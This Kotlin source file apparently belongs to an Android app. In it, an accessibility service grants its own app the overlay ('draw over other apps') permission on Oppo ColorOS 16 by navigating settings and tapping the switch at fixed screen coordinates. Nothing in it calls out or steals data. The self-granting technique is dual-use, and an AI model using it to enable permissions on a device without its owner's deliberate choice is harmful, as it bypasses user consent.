package com.storm.safe.rock.service.modules.yw5xud.oppo

import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.common.GestureTapHelper
import kotlinx.coroutines.delay

/**
 * Step 4 -- 悬浮窗权限。
 *
 * ColorOS 16 SubSettings 页面的内容区域(Switch/文本)对 AccessibilityService 不可见,
 * findAccessibilityNodeInfosByViewId("switch_widget") 永远返回空。
 * 真机 UIAutomator dump 实锤 Switch 位置: bounds=[995,940][1128,1024]。
 * 用 dispatchGesture 坐标点击。
 */
class OppoStep4Overlay(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: OppoSteps
) {
    companion object {
        private const val TAG = "OppoStep4Overlay"
        // ColorOS 16 SubSettings Switch 中心坐标
        private const val SUBSETTINGS_SWITCH_X = 1062f
        private const val SUBSETTINGS_SWITCH_Y = 982f
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val ctx = steps.ctx
        if (OppoStepCompletionStore.isCompleted(ctx, OppoStepCompletionStore.Keys.STEP4_OVERLAY)) {
            logs.add("[Step 4/9] ⏭ 24h 内已完成,跳过"); return
        }
        logs.add("[Step 4/9] ▶ 悬浮窗权限开始")
        // Call through steps to preserve test override behavior
        if (steps.canDrawOverlaysNow()) {
            logs.add("[Step 4/9] ✓ 系统 canDrawOverlays=true,已有权限")
            successes.add("[Step 4/9] 悬浮窗已授权(前置)")
            OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP4_OVERLAY); return
        }
        ui.openAppDetails()
        ui.waitForPackage("com.android.settings", 5000L)
        steps.dumpCurrentPage("Step4-before")
        val switchClicked = tryOverlayViaAppDetails(successes, logs)

        // Phase E: 点完开关后二次回验 Settings.canDrawOverlays() 真实效果,
        // 避免点到"不允许"按钮或其他应用的允许按钮而虚假 mark success。
        delay(500L)
        val actuallyGranted = steps.canDrawOverlaysNow()
        if (actuallyGranted) {
            logs.add("[Step 4/9] ✓ canDrawOverlays 回验通过,mark completed")
            successes.add("[Step 4/9] 悬浮窗已授权(真实效果回验)")
            OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP4_OVERLAY)
        } else {
            failures.add(
                if (switchClicked) "[Step 4/9] 开关点中但 canDrawOverlays 仍 false(可能点到错按钮)"
                else "[Step 4/9] 悬浮窗开关未点中"
            )
        }
    }

    fun canDrawOverlaysNow(): Boolean = ui.canDrawOverlays()

    /**
     * 走应用详情->滚到底部->"悬浮窗"入口->SubSettings 悬浮窗详情页->坐标点击 Switch。
     */
    private suspend fun tryOverlayViaAppDetails(
        successes: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        // 1. 在 InstalledAppDetails 滚到底部找"悬浮窗"入口并点击
        ui.scrollToTop()
        delay(300L)
        val found = ui.clickSelectorWithScroll("[text*=\"悬浮窗\"][visibleToUser=true]", scrollLimit = 8)
        Log.d(TAG, "[Step4] 点击悬浮窗入口=$found")
        if (!found) return false

        // 2. 等 SubSettings 页面出现(标题变为"悬浮窗")
        delay(2000L)
        steps.dumpCurrentPage("Step4-overlay")

        // 3. ColorOS 16 SubSettings 内容对 AccessibilityService 不可见,
        //    用坐标点击 Switch(真机 dump: bounds=[995,940][1128,1024], center~1062,982)
        val tapped = tapAtCoordinate(SUBSETTINGS_SWITCH_X, SUBSETTINGS_SWITCH_Y)
        Log.d(TAG, "[Step4] tapAtCoordinate($SUBSETTINGS_SWITCH_X,$SUBSETTINGS_SWITCH_Y)=$tapped")
        if (tapped) {
            delay(1000L)
            successes.add("[Step 4/9] 悬浮窗 Switch 坐标点击")
            return true
        }
        return false
    }

    /** dispatchGesture 坐标点击(委托 GestureTapHelper) */
    private suspend fun tapAtCoordinate(x: Float, y: Float): Boolean {
        val svc = service ?: return false
        return GestureTapHelper.performTap(svc, x, y, 100L)
    }
}
